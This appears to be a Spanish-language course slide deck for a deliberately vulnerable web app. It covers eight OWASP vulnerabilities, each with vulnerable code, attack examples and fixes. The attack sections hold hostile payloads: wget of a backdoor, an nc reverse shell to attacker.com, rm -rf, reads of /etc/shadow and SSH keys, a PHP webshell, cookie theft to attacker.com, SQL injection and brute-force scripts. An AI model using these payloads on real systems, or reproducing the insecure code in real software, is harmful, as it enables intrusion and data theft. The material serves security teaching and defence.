# Práctica de Seguridad Web
## Aplicación Vulnerable - Trabajo Práctico

**Ciberseguridad - 2025**

---

## 📋 Agenda

1. **Introducción al Proyecto**
2. **Arquitectura de la Aplicación**
3. **Demo en Vivo**
4. **Las 8 Vulnerabilidades**
   - Descripción
   - Riesgos
   - Cómo explotarlas
   - Cómo corregirlas
5. **Metodología de Trabajo (TDD)**
6. **Stack Tecnológico**

---

## 🎯 Objetivo del Proyecto

### ¿Qué es esta aplicación?

Una **aplicación web full-stack intencionalmente vulnerable** diseñada para:

- ✅ Aprender sobre vulnerabilidades comunes (OWASP Top 10)
- ✅ Practicar detección de vulnerabilidades
- ✅ Entender el impacto de código inseguro
- ✅ Implementar correcciones efectivas
- ✅ Trabajar con Test-Driven Development (TDD)

### ⚠️ Advertencia

**NO USAR EN PRODUCCIÓN** - Contiene vulnerabilidades críticas intencionales

---

## 🏗️ Arquitectura de la Aplicación

```
┌─────────────────────────────────────────────────┐
│           Usuario (Navegador)                    │
│              localhost:3000                      │
└───────────────────┬─────────────────────────────┘
                    │ HTTP/REST
┌───────────────────▼─────────────────────────────┐
│         Frontend - React + Vite                  │
│  • TypeScript                                    │
│  • React Router                                  │
│  • Componentes por vulnerabilidad               │
└───────────────────┬─────────────────────────────┘
                    │ API Calls
┌───────────────────▼─────────────────────────────┐
│         Backend - Node.js + Express              │
│  • /src/controllers  (Lógica vulnerable)        │
│  • /src/routes       (API endpoints)            │
│  • /test/security    (Tests de seguridad)       │
└───────────────────┬─────────────────────────────┘
                    │ SQL Queries
┌───────────────────▼─────────────────────────────┐
│            Base de Datos - MySQL                 │
│  • Usuarios (admin, user1)                      │
│  • Productos                                     │
│  • Transferencias                                │
└─────────────────────────────────────────────────┘
```

---

## 💻 Stack Tecnológico

### Frontend
- **React 18** + **TypeScript** - Framework UI moderno
- **Vite** - Build tool ultra-rápido (HMR instantáneo)
- **Axios** - Cliente HTTP para llamadas API
- **React Router** - Navegación entre vulnerabilidades

### Backend
- **Node.js** + **Express** - Framework web
- **MySQL** - Base de datos relacional
- **Jest** + **Supertest** - Testing framework
- **bcrypt** - Hash de contraseñas
- **JWT** - Autenticación con tokens

### DevOps
- **Docker** + **Docker Compose** - Containerización
- **Nodemon** - Auto-reload en desarrollo

---

## 📁 Estructura del Proyecto

```
ciberseg-tp/
├── backend/
│   ├── src/              # 📝 Código fuente
│   │   ├── controllers/  # ⚠️ AQUÍ están las vulnerabilidades
│   │   ├── routes/
│   │   ├── config/
│   │   └── server.js
│   ├── test/             # 🧪 Tests de seguridad
│   │   ├── security/     # 8 archivos de test
│   │   └── setup.js
│   └── init.sql          # DB initialization
│
└── frontend/
    ├── src/
    │   ├── components/
    │   │   └── vulnerabilities/  # UI por vulnerabilidad
    │   └── services/             # API calls
    └── vite.config.ts
```

---

## 🚀 Demo en Vivo

### Iniciar la Aplicación

```bash
# 1. Clonar el repositorio
git clone <repo>
cd ciberseg-tp

# 2. Levantar con Docker
docker compose up --build

# 3. Acceder
# Frontend: http://localhost:3000
# Backend:  http://localhost:5000
# MySQL:    localhost:3306
```

### Credenciales

- **Admin**: admin / admin123
- **Usuario**: user1 / user123

---

## 🎮 Demostración de la Aplicación

### Funcionalidades Principales

1. **Login/Registro** - Autenticación de usuarios
2. **Dashboard** - Listado de vulnerabilidades
3. **8 Secciones Interactivas** - Una por cada vulnerabilidad:
   - Brute Force
   - Command Injection
   - CSRF
   - File Inclusion (LFI)
   - File Upload
   - Insecure CAPTCHA
   - SQL Injection
   - Blind SQL Injection

Cada sección incluye:
- 📝 Descripción de la vulnerabilidad
- 💻 Interfaz interactiva para probarla
- ⚠️ Advertencias de seguridad
- 🔍 Ejemplos de código malicioso

---

## 📊 Las 8 Vulnerabilidades

### Lista Completa

| # | Vulnerabilidad | OWASP | Severidad |
|---|---------------|-------|-----------|
| 1 | Brute Force | A07:2021 | 🔴 Alta |
| 2 | Command Injection | A03:2021 | 🔴 Crítica |
| 3 | CSRF | A01:2021 | 🟡 Media |
| 4 | File Inclusion (LFI) | A01:2021 | 🔴 Alta |
| 5 | File Upload | A04:2021 | 🔴 Crítica |
| 6 | Insecure CAPTCHA | A07:2021 | 🟡 Media |
| 7 | SQL Injection | A03:2021 | 🔴 Crítica |
| 8 | Blind SQL Injection | A03:2021 | 🔴 Crítica |

---

# 1️⃣ Brute Force Attack

## ¿Qué es?

Ataque que intenta **adivinar credenciales** mediante prueba y error automatizada.

### Código Vulnerable

```javascript
// ❌ Sin protección - authController.js
const login = async (req, res) => {
  const { username, password } = req.body;

  // Sin límite de intentos
  // Sin CAPTCHA
  // Sin delays

  const user = await findUser(username);
  if (user && await bcrypt.compare(password, user.password)) {
    return res.json({ token: generateToken(user) });
  }

  res.status(401).json({ error: 'Credenciales inválidas' });
};
```

---

## 1️⃣ Brute Force - Explotación

### Ataque Automatizado

```python
import requests

url = "http://localhost:5000/api/login"
passwords = ["123456", "password", "admin", "admin123", ...]

for password in passwords:
    response = requests.post(url, json={
        "username": "admin",
        "password": password
    })

    if response.status_code == 200:
        print(f"✅ Contraseña encontrada: {password}")
        break
```

**Resultado**: En segundos se pueden probar miles de contraseñas

---

## 1️⃣ Brute Force - Impacto

### Riesgos

- 🔓 **Acceso no autorizado** a cuentas
- 💰 **Robo de identidad** y datos personales
- 🚨 **Compromiso total** del sistema
- 📊 **Escalada de privilegios** si se accede a admin

### Casos Reales

- **iCloud Celebrity Hack (2014)** - Filtración de fotos mediante brute force
- **LinkedIn (2012)** - 6.5M contraseñas comprometidas
- **Dropbox (2012)** - 68M cuentas vulneradas

---

## 1️⃣ Brute Force - Corrección

### Solución Multi-Capa

```javascript
// ✅ Rate Limiting
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutos
  max: 5,                     // 5 intentos
  message: 'Demasiados intentos. Intente más tarde.'
});

app.post('/api/login', loginLimiter, login);

// ✅ CAPTCHA después de 3 intentos fallidos
// ✅ Delay progresivo (1s, 2s, 4s, 8s...)
// ✅ Bloqueo temporal de cuenta
// ✅ Notificación al usuario
// ✅ Logging de intentos sospechosos
```

---

# 2️⃣ Command Injection

## ¿Qué es?

Ejecución de **comandos del sistema operativo** mediante entrada no validada.

### Código Vulnerable

```javascript
// ❌ Peligroso - vulnerabilityController.js
const ping = (req, res) => {
  const { host } = req.body;

  // Ejecuta directamente el comando sin validar
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.json({ output: stdout });
  });
};
```

### ¿Dónde está el problema?

El usuario puede inyectar comandos adicionales usando `;`, `&&`, `||`, `|`

---

## 2️⃣ Command Injection - Explotación

### Ataques Posibles

```bash
# 1. Ver archivos del sistema
8.8.8.8; cat /etc/passwd

# 2. Listar directorios
8.8.8.8 && ls -la /

# 3. Descargar malware
8.8.8.8; wget http://malware.com/backdoor.sh -O /tmp/backdoor.sh

# 4. Reverse shell
8.8.8.8; nc attacker.com 4444 -e /bin/bash

# 5. Borrar archivos
8.8.8.8 && rm -rf /important/files
```

**Resultado**: Control total del servidor

---

## 2️⃣ Command Injection - Impacto

### Consecuencias

- 💥 **Ejecución arbitraria de código** en el servidor
- 🔓 **Acceso a archivos confidenciales** (/etc/passwd, .env)
- 🚪 **Instalación de backdoors** permanentes
- 📊 **Robo de base de datos** completa
- 🔥 **Denegación de servicio** (DoS)
- 🎯 **Pivote para otros ataques** laterales

### Casos Reales

- **Shellshock (2014)** - Bash vulnerability
- **Log4Shell (2021)** - Apache Log4j RCE
- **Equifax (2017)** - Brecha que afectó a 147M personas

---

## 2️⃣ Command Injection - Corrección

### Soluciones

```javascript
// ✅ Opción 1: Whitelist estricta
const ping = (req, res) => {
  const { host } = req.body;

  // Validar que sea una IP o dominio válido
  const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
  const domainRegex = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

  if (!ipRegex.test(host) && !domainRegex.test(host)) {
    return res.status(400).json({ error: 'Host inválido' });
  }

  // ✅ Usar spawn con argumentos separados (más seguro)
  const { spawn } = require('child_process');
  const process = spawn('ping', ['-c', '4', host]);

  let output = '';
  process.stdout.on('data', (data) => output += data);
  process.on('close', () => res.json({ output }));
};

// ✅ Nunca usar: exec, eval, system
// ✅ Sanitizar TODA entrada del usuario
// ✅ Principio de menor privilegio
```

---

# 3️⃣ CSRF (Cross-Site Request Forgery)

## ¿Qué es?

Forzar a un **usuario autenticado** a ejecutar acciones no deseadas.

### Código Vulnerable

```javascript
// ❌ Sin protección CSRF
app.post('/api/transfer', authenticate, (req, res) => {
  const { fromAccount, toAccount, amount } = req.body;

  // Confía en que la petición viene del usuario
  // No valida el origen de la petición

  transferMoney(fromAccount, toAccount, amount);
  res.json({ message: 'Transferencia exitosa' });
});
```

### ¿Cuál es el problema?

No hay forma de verificar que la petición la hizo realmente el usuario.

---

## 3️⃣ CSRF - Explotación

### Ataque Típico

```html
<!-- Página maliciosa: evil.com -->
<html>
  <body onload="document.forms[0].submit()">
    <h1>¡Felicidades! Has ganado un premio</h1>

    <!-- Formulario oculto que se envía automáticamente -->
    <form action="http://banco.com/api/transfer" method="POST">
      <input type="hidden" name="fromAccount" value="victima-123" />
      <input type="hidden" name="toAccount" value="atacante-456" />
      <input type="hidden" name="amount" value="10000" />
    </form>
  </body>
</html>
```

**Escenario**:
1. Usuario está logueado en el banco
2. Visita evil.com
3. El formulario se envía automáticamente
4. **¡Dinero transferido sin consentimiento!**

---

## 3️⃣ CSRF - Impacto

### Consecuencias

- 💸 **Transferencias no autorizadas** de dinero
- 📧 **Cambio de email/contraseña** de la víctima
- 🛒 **Compras fraudulentas** en tiendas online
- 👤 **Modificación de perfil** o configuración
- 🗑️ **Eliminación de datos** importantes
- ⚙️ **Cambios en configuración** de seguridad

### Casos Reales

- **Gmail (2007)** - CSRF en filtros de email
- **YouTube (2008)** - CSRF permitía acciones no autorizadas
- **Netflix (2006)** - Cambio de plan de suscripción

---

## 3️⃣ CSRF - Corrección

### Solución con Tokens CSRF

```javascript
// ✅ Implementar tokens CSRF
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Generar token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Validar token en peticiones
app.post('/api/transfer', csrfProtection, (req, res) => {
  // El middleware csrf valida automáticamente el token
  transferMoney(req.body);
  res.json({ message: 'Transferencia exitosa' });
});

// ✅ Frontend debe incluir el token
// ✅ Cookies SameSite
// ✅ Verificar header Referer/Origin
// ✅ Re-autenticación para acciones críticas
```

---

# 4️⃣ File Inclusion (LFI)

## ¿Qué es?

Acceso a **archivos arbitrarios** del servidor mediante path traversal.

### Código Vulnerable

```javascript
// ❌ Permite acceder a cualquier archivo
const readFile = (req, res) => {
  const { filename } = req.query;

  // No valida la ruta
  const filePath = path.join(__dirname, '../files/', filename);

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) return res.status(404).json({ error: 'Archivo no encontrado' });
    res.send(data);
  });
};

// GET /api/file?filename=config.txt  ✅ OK
// GET /api/file?filename=../../etc/passwd  ❌ PELIGRO!
```

---

## 4️⃣ File Inclusion - Explotación

### Ataques con Path Traversal

```bash
# 1. Leer archivos del sistema
GET /api/file?filename=../../../etc/passwd
GET /api/file?filename=../../../etc/shadow

# 2. Acceder a configuración
GET /api/file?filename=../../.env
GET /api/file?filename=../../config/database.js

# 3. Leer código fuente
GET /api/file?filename=../../server.js
GET /api/file?filename=../../controllers/authController.js

# 4. Logs con información sensible
GET /api/file?filename=../../../var/log/apache/access.log

# 5. Claves SSH
GET /api/file?filename=../../../root/.ssh/id_rsa
```

---

## 4️⃣ File Inclusion - Impacto

### Consecuencias

- 🔑 **Exposición de credenciales** (API keys, passwords)
- 📄 **Acceso a código fuente** (propiedad intelectual)
- 🗂️ **Lectura de archivos sensibles** del sistema
- 👥 **Información de usuarios** (/etc/passwd)
- 🔐 **Claves criptográficas** expuestas
- 🎯 **Reconocimiento** para otros ataques

### Casos Reales

- **PHP Include Vulnerabilities** - Muy comunes históricamente
- **WordPress Plugins** - Múltiples casos de LFI
- **Zimbra (2019)** - Path traversal permitía leer archivos

---

## 4️⃣ File Inclusion - Corrección

### Soluciones

```javascript
// ✅ Whitelist de archivos permitidos
const ALLOWED_FILES = ['readme.txt', 'config.txt', 'public.txt'];

const readFile = (req, res) => {
  const { filename } = req.query;

  // 1. Validar contra whitelist
  if (!ALLOWED_FILES.includes(filename)) {
    return res.status(403).json({ error: 'Archivo no permitido' });
  }

  // 2. Sanitizar el path
  const safePath = path.normalize(filename).replace(/^(\.\.(\/|\\|$))+/, '');
  const filePath = path.join(__dirname, '../files/', safePath);

  // 3. Verificar que está dentro del directorio permitido
  const realPath = fs.realpathSync(filePath);
  const allowedDir = fs.realpathSync(path.join(__dirname, '../files/'));

  if (!realPath.startsWith(allowedDir)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  // 4. Leer el archivo
  fs.readFile(realPath, 'utf8', (err, data) => {
    if (err) return res.status(404).json({ error: 'Archivo no encontrado' });
    res.send(data);
  });
};
```

---

# 5️⃣ Insecure File Upload

## ¿Qué es?

Subida de **archivos maliciosos** sin validación adecuada.

### Código Vulnerable

```javascript
// ❌ Sin validación
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/api/upload', upload.single('file'), (req, res) => {
  // Acepta CUALQUIER archivo
  // No valida tipo, tamaño, contenido
  // Mantiene el nombre original

  res.json({
    filename: req.file.originalname,
    path: `/uploads/${req.file.filename}`
  });
});
```

### ¿Qué puede salir mal?

El atacante puede subir webshells, malware, scripts maliciosos...

---

## 5️⃣ File Upload - Explotación

### Ataques Comunes

```bash
# 1. Webshell PHP
# Archivo: shell.php
<?php system($_GET['cmd']); ?>

# Acceso: http://site.com/uploads/shell.php?cmd=ls

# 2. Reverse Shell
# Archivo: backdoor.jsp
<%@ page import="java.util.*,java.io.*"%>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 3. HTML con XSS
# Archivo: malicious.html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

# 4. Archivo enorme (DoS)
# Archivo: huge.zip (10GB)

# 5. Zip Bomb
# Archivo comprimido que se expande a 4.5 PB
```

---

## 5️⃣ File Upload - Impacto

### Consecuencias

- 🚪 **Remote Code Execution (RCE)** - Control total del servidor
- 💣 **Webshells** - Acceso persistente
- 🦠 **Distribución de malware** a otros usuarios
- 💥 **Denegación de servicio** (DoS) con archivos enormes
- 📊 **Defacement** - Modificación del sitio
- 🔓 **Escalada de privilegios**

### Casos Reales

- **Equifax (2017)** - Vulnerabilidad de upload contribuyó a la brecha
- **Ashley Madison (2015)** - Upload de shell malicioso
- **Sony Pictures (2014)** - Malware subido al sistema

---

## 5️⃣ File Upload - Corrección

### Validación Multi-Capa

```javascript
// ✅ Configuración segura
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    // ✅ Generar nombre aleatorio
    const uniqueName = crypto.randomBytes(16).toString('hex');
    cb(null, uniqueName + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024  // ✅ Límite: 5MB
  },
  fileFilter: (req, file, cb) => {
    // ✅ Whitelist de extensiones
    const allowedExts = ['.jpg', '.jpeg', '.png', '.pdf'];
    const ext = path.extname(file.originalname).toLowerCase();

    if (!allowedExts.includes(ext)) {
      return cb(new Error('Tipo de archivo no permitido'));
    }

    // ✅ Validar MIME type
    const allowedMimes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (!allowedMimes.includes(file.mimetype)) {
      return cb(new Error('MIME type no permitido'));
    }

    cb(null, true);
  }
});

// ✅ Escaneo antivirus (en producción)
// ✅ Almacenar fuera del webroot
// ✅ No ejecutar archivos subidos
```

---

# 6️⃣ Insecure CAPTCHA

## ¿Qué es?

Implementación **débil o reutilizable** de CAPTCHA que puede ser bypasseada.

### Código Vulnerable

```javascript
// ❌ CAPTCHA predecible y reutilizable
let captchaStore = {};

const generateCaptcha = (req, res) => {
  const captcha = svgCaptcha.create();
  const captchaId = Date.now();  // ❌ Predecible

  captchaStore[captchaId] = captcha.text;

  res.json({
    captchaId,
    captchaImage: captcha.data
  });
};

const verifyCaptcha = (req, res) => {
  const { captchaId, captchaText } = req.body;

  // ❌ No expira
  // ❌ No se elimina después de usar
  // ❌ Puede reutilizarse infinitamente

  if (captchaStore[captchaId] === captchaText) {
    res.json({ valid: true });
  } else {
    res.json({ valid: false });
  }
};
```

---

## 6️⃣ Insecure CAPTCHA - Explotación

### Bypass del CAPTCHA

```python
# Ataque de reutilización
import requests

# 1. Resolver el CAPTCHA una vez (manualmente o con OCR)
response = requests.get('http://site.com/api/captcha')
captcha_id = response.json()['captchaId']
# Usuario resuelve: "ABC123"

# 2. Reutilizar infinitamente
for i in range(10000):
    requests.post('http://site.com/api/login', json={
        'username': 'admin',
        'password': f'password{i}',
        'captchaId': captcha_id,      # ✅ Mismo ID
        'captchaText': 'ABC123'        # ✅ Misma respuesta
    })
```

**Resultado**: El CAPTCHA es inútil, permite brute force

---

## 6️⃣ Insecure CAPTCHA - Impacto

### Consecuencias

- 🤖 **Bypassing de protecciones** anti-bot
- 💥 **Habilitación de brute force** attacks
- 📧 **Spam masivo** en formularios
- 🎫 **Scalping de tickets** automatizado
- 💰 **Fraude** en sistemas de registro/compra
- 🔄 **Creación masiva** de cuentas falsas

### Problemas Comunes

- CAPTCHA sin expiración
- CAPTCHA reutilizable
- CAPTCHA demasiado simple
- Validación del lado del cliente
- ID predecibles

---

## 6️⃣ Insecure CAPTCHA - Corrección

### Implementación Segura

```javascript
// ✅ CAPTCHA con expiración y uso único
const crypto = require('crypto');

let captchaStore = new Map();

const generateCaptcha = (req, res) => {
  const captcha = svgCaptcha.create({
    size: 6,
    noise: 3,
    color: true
  });

  // ✅ ID impredecible
  const captchaId = crypto.randomBytes(32).toString('hex');

  captchaStore.set(captchaId, {
    text: captcha.text,
    createdAt: Date.now(),
    used: false  // ✅ Tracking de uso
  });

  // ✅ Limpiar CAPTCHAs viejos
  cleanExpiredCaptchas();

  res.json({
    captchaId,
    captchaImage: captcha.data
  });
};

const verifyCaptcha = (req, res) => {
  const { captchaId, captchaText } = req.body;

  const stored = captchaStore.get(captchaId);

  if (!stored) {
    return res.json({ valid: false, error: 'CAPTCHA no encontrado' });
  }

  // ✅ Verificar expiración (5 minutos)
  const age = Date.now() - stored.createdAt;
  if (age > 5 * 60 * 1000) {
    captchaStore.delete(captchaId);
    return res.json({ valid: false, error: 'CAPTCHA expirado' });
  }

  // ✅ Verificar que no se haya usado
  if (stored.used) {
    return res.json({ valid: false, error: 'CAPTCHA ya utilizado' });
  }

  // ✅ Marcar como usado
  stored.used = true;

  // Validar
  const isValid = stored.text === captchaText;

  // ✅ Eliminar después de validar
  setTimeout(() => captchaStore.delete(captchaId), 1000);

  res.json({ valid: isValid });
};

// ✅ Mejor: usar Google reCAPTCHA v3
```

---

# 7️⃣ SQL Injection

## ¿Qué es?

Inyección de **código SQL malicioso** en queries para manipular la base de datos.

### Código Vulnerable

```javascript
// ❌ NUNCA hacer esto
const login = (req, res) => {
  const { username, password } = req.body;

  // Concatenación directa = PELIGRO
  const query = `
    SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'
  `;

  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ success: true, user: results[0] });
    } else {
      res.status(401).json({ error: 'Credenciales inválidas' });
    }
  });
};
```

---

## 7️⃣ SQL Injection - Explotación

### Ataques Clásicos

```sql
-- 1. Bypass de autenticación
username: admin' OR '1'='1
password: cualquier_cosa

-- Query resultante:
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'
AND password = 'cualquier_cosa'
-- '1'='1' es siempre verdadero → Acceso garantizado

-- 2. Comentar resto de la query
username: admin'--
password: (no importa)

-- 3. UNION para extraer datos
username: ' UNION SELECT username, password FROM users--
password: x

-- 4. Borrar tablas (si tiene permisos)
username: admin'; DROP TABLE users;--
password: x

-- 5. Extraer toda la base de datos
username: ' UNION SELECT table_name, null FROM information_schema.tables--
```

---

## 7️⃣ SQL Injection - Impacto

### Consecuencias

- 🔓 **Bypass completo** de autenticación
- 📊 **Robo de toda la base de datos** (usuarios, tarjetas, etc.)
- 💣 **Eliminación de datos** (DROP TABLE)
- ✏️ **Modificación de datos** (UPDATE, DELETE)
- 👤 **Escalada de privilegios** (convertirse en admin)
- 🚪 **RCE en algunos casos** (xp_cmdshell en SQL Server)
- 🔐 **Extracción de hashes** de contraseñas

### Casos Reales

- **Sony (2011)** - 77M cuentas comprometidas por SQL injection
- **TalkTalk (2015)** - £400,000 de multa por SQLi
- **Heartland Payment (2008)** - 130M tarjetas de crédito robadas

---

## 7️⃣ SQL Injection - Corrección

### Solución: Prepared Statements

```javascript
// ✅ Queries parametrizadas
const login = (req, res) => {
  const { username, password } = req.body;

  // ✅ Usar placeholders (?)
  const query = 'SELECT * FROM users WHERE username = ?';

  db.query(query, [username], async (err, results) => {
    if (err) {
      return res.status(500).json({ error: 'Error en el servidor' });
    }

    if (results.length === 0) {
      return res.status(401).json({ error: 'Credenciales inválidas' });
    }

    const user = results[0];

    // ✅ Validar password con bcrypt
    const isValid = await bcrypt.compare(password, user.password);

    if (!isValid) {
      return res.status(401).json({ error: 'Credenciales inválidas' });
    }

    // ✅ Generar token
    const token = jwt.sign({ id: user.id }, process.env.JWT_SECRET);
    res.json({ success: true, token });
  });
};

// ✅ NUNCA concatenar strings en SQL
// ✅ Usar ORM (Sequelize, TypeORM)
// ✅ Principio de menor privilegio en DB
// ✅ Validar y sanitizar entrada
// ✅ Escapar caracteres especiales
```

---

# 8️⃣ Blind SQL Injection

## ¿Qué es?

SQL Injection donde **no se ven los resultados directamente**, pero se puede inferir información mediante:
- Respuestas diferentes (TRUE/FALSE)
- Diferencias de tiempo

### Código Vulnerable

```javascript
// ❌ Vulnerable a Blind SQLi
const checkUsername = (req, res) => {
  const { username } = req.body;

  // Concatenación directa
  const query = `
    SELECT COUNT(*) as count
    FROM users
    WHERE username = '${username}'
  `;

  db.query(query, (err, results) => {
    if (err) {
      // ❌ Expone errores SQL
      return res.status(500).json({ error: err.message });
    }

    // ❌ Respuesta revela si el usuario existe
    const exists = results[0].count > 0;
    res.json({ exists });
  });
};
```

---

## 8️⃣ Blind SQL Injection - Explotación

### Boolean-Based Blind SQLi

```python
# Enumerar usuarios carácter por carácter
import requests
import string

url = "http://site.com/api/check-username"
username = ""

# Para cada posición
for position in range(1, 20):
    # Probar cada carácter
    for char in string.ascii_lowercase + string.digits:
        # Payload: admin' AND SUBSTRING(password, {position}, 1) = '{char}
        payload = f"admin' AND SUBSTRING(password, {position}, 1) = '{char}'--"

        response = requests.post(url, json={'username': payload})

        if response.json()['exists'] == True:
            username += char
            print(f"Carácter encontrado: {char}")
            break

print(f"Password: {username}")
```

### Time-Based Blind SQLi

```sql
-- Si la condición es verdadera, duerme 5 segundos
admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--

-- Medir el tiempo de respuesta para inferir información
```

---

## 8️⃣ Blind SQL Injection - Impacto

### Consecuencias

- 🕵️ **Enumeración de usuarios** del sistema
- 🔐 **Extracción de contraseñas** carácter por carácter
- 📊 **Mapeo completo** de la estructura de DB
- 🔑 **Robo de datos sensibles** (emails, tokens, API keys)
- 🎯 **Información para otros ataques** (phishing, credential stuffing)
- ⏱️ **Time-based**: Más lento pero igualmente efectivo

### Diferencia con SQLi Normal

- **SQLi Normal**: Resultados visibles inmediatamente
- **Blind SQLi**: Inferir información mediante:
  - Respuestas TRUE/FALSE
  - Timing attacks
  - Error messages

---

## 8️⃣ Blind SQL Injection - Corrección

### Soluciones

```javascript
// ✅ Queries parametrizadas
const checkUsername = (req, res) => {
  const { username } = req.body;

  // ✅ Usar placeholders
  const query = 'SELECT COUNT(*) as count FROM users WHERE username = ?';

  db.query(query, [username], (err, results) => {
    if (err) {
      // ✅ No exponer detalles del error
      return res.status(500).json({
        error: 'Error al verificar usuario'
      });
    }

    const exists = results[0].count > 0;

    // ✅ Rate limiting para prevenir enumeración
    // ✅ Respuestas genéricas (no revelar si existe o no)
    // ✅ Delay constante (evitar timing attacks)

    setTimeout(() => {
      res.json({ exists });
    }, 100);  // Delay consistente
  });
};

// ✅ Adicional:
// - CAPTCHA después de varios intentos
// - Logging de intentos sospechosos
// - Respuestas ambiguas
// - WAF (Web Application Firewall)
```

---

## 🧪 Metodología TDD

### Test-Driven Development

```
┌─────────────────────────────────────────┐
│  1. Ejecutar Tests (todos fallan ❌)    │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│  2. Leer instrucciones del test         │
│     test/security/01-brute-force.test.js│
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│  3. Implementar corrección               │
│     src/controllers/authController.js    │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│  4. Re-ejecutar test                     │
│     npx jest test/security/01-...       │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│  5. Test pasa? ✅                        │
│     Sí → Siguiente vulnerabilidad        │
│     No → Refinar corrección              │
└─────────────────────────────────────────┘
```

---

## 🧪 Ejecutar los Tests

### Comandos

```bash
# 1. Todos los tests de seguridad
cd backend
npm run test:security

# 2. Test específico
npx jest test/security/01-brute-force.test.js

# 3. Test con detalles
npx jest test/security/01-brute-force.test.js --verbose

# 4. Todos los tests en modo watch
npm test

# 5. Cobertura de código
npm run test:coverage
```

---

## 📊 Progreso Visual

### Runner Personalizado

```bash
$ npm run test:security

🔒 EJECUTANDO TESTS DE SEGURIDAD
═══════════════════════════════════════════════════════════════
Todos los tests deben FALLAR (❌) inicialmente.
Tu objetivo es implementar las correcciones para que PASEN (✅).
═══════════════════════════════════════════════════════════════

📋 Ejecutando: 01-brute-force.test.js
──────────────────────────────────────────────────
❌ FAIL - BRUTE FORCE

📋 Ejecutando: 02-command-injection.test.js
──────────────────────────────────────────────────
❌ FAIL - COMMAND INJECTION

...

📊 RESUMEN DE RESULTADOS
═══════════════════════════════════════════════════════════════

❌ FAIL - BRUTE FORCE
❌ FAIL - COMMAND INJECTION
❌ FAIL - CSRF PROTECTION
❌ FAIL - FILE INCLUSION
❌ FAIL - FILE UPLOAD
❌ FAIL - INSECURE CAPTCHA
❌ FAIL - SQL INJECTION
❌ FAIL - BLIND SQL INJECTION

─────────────────────────────────────────────────────────────
Total: 0/8 vulnerabilidades corregidas
Progreso: [                    ] 0%

💪 Sigue trabajando para corregir las vulnerabilidades restantes.
═══════════════════════════════════════════════════════════════
```

---

## 🎯 Objetivo: 100% Tests Passing

### Meta Final

```bash
📊 RESUMEN DE RESULTADOS
═══════════════════════════════════════════════════════════════

✅ PASS - BRUTE FORCE
✅ PASS - COMMAND INJECTION
✅ PASS - CSRF PROTECTION
✅ PASS - FILE INCLUSION
✅ PASS - FILE UPLOAD
✅ PASS - INSECURE CAPTCHA
✅ PASS - SQL INJECTION
✅ PASS - BLIND SQL INJECTION

─────────────────────────────────────────────────────────────
Total: 8/8 vulnerabilidades corregidas
Progreso: [████████████████████] 100%

🎉 ¡FELICITACIONES! Has corregido todas las vulnerabilidades.
═══════════════════════════════════════════════════════════════
```

---

## 📚 Recursos de Aprendizaje

### Documentación Oficial

- **OWASP Top 10** - https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheets** - https://cheatsheetseries.owasp.org/
- **CWE Top 25** - https://cwe.mitre.org/top25/

### Herramientas

- **Burp Suite** - Proxy para testing de seguridad
- **OWASP ZAP** - Scanner de vulnerabilidades
- **SQLMap** - Automatización de SQL Injection
- **Postman** - Testing de APIs

### Práctica

- **HackTheBox** - Plataformas de hacking ético
- **TryHackMe** - Labs guiados
- **PortSwigger Academy** - Tutoriales interactivos

---

## 🔐 Principios de Seguridad

### Reglas de Oro

1. **Never Trust User Input** - Validar y sanitizar TODO
2. **Defense in Depth** - Múltiples capas de seguridad
3. **Principle of Least Privilege** - Mínimos permisos necesarios
4. **Fail Securely** - Errores no deben exponer información
5. **Security by Design** - Pensar en seguridad desde el inicio
6. **Keep Software Updated** - Parches de seguridad
7. **Use Security Headers** - Helmet.js, CSP, HSTS
8. **Encrypt Sensitive Data** - At rest y in transit
9. **Log and Monitor** - Detectar anomalías
10. **Security Training** - Educación continua

---

## 🚀 Primeros Pasos

### Para Empezar

```bash
# 1. Clonar repositorio
git clone <repo-url>
cd ciberseg-tp

# 2. Levantar con Docker
docker compose up --build

# 3. Acceder
# Frontend: http://localhost:3000
# Backend:  http://localhost:5000

# 4. Login
# Usuario: admin / admin123

# 5. Ejecutar tests
cd backend
npm run test:security

# 6. ¡A corregir vulnerabilidades!
```

---

## 📝 Estructura de Entrega

### Qué Incluir

1. **Código Corregido** - Commits por cada vulnerabilidad
2. **Tests Pasando** - Captura de 8/8 ✅
3. **Documentación** - README con explicaciones
4. **Análisis** - Documento explicando cada corrección:
   - ¿Qué era vulnerable?
   - ¿Cómo lo explotaste?
   - ¿Cómo lo corregiste?
   - ¿Qué aprendiste?

### Bonus

- Screenshots de explotaciones
- Scripts de ataque personalizados
- Mejoras adicionales de seguridad
- Integración de herramientas (Helmet, Rate Limiting)

---

## ❓ Preguntas Frecuentes

### FAQ

**Q: ¿Puedo usar librerías adicionales?**
A: Sí, express-rate-limit, helmet, validator, etc.

**Q: ¿Debo corregir todas las vulnerabilidades?**
A: Sí, el objetivo es 8/8 tests pasando.

**Q: ¿Puedo trabajar sin Docker?**
A: Sí, necesitarás Node.js y MySQL local.

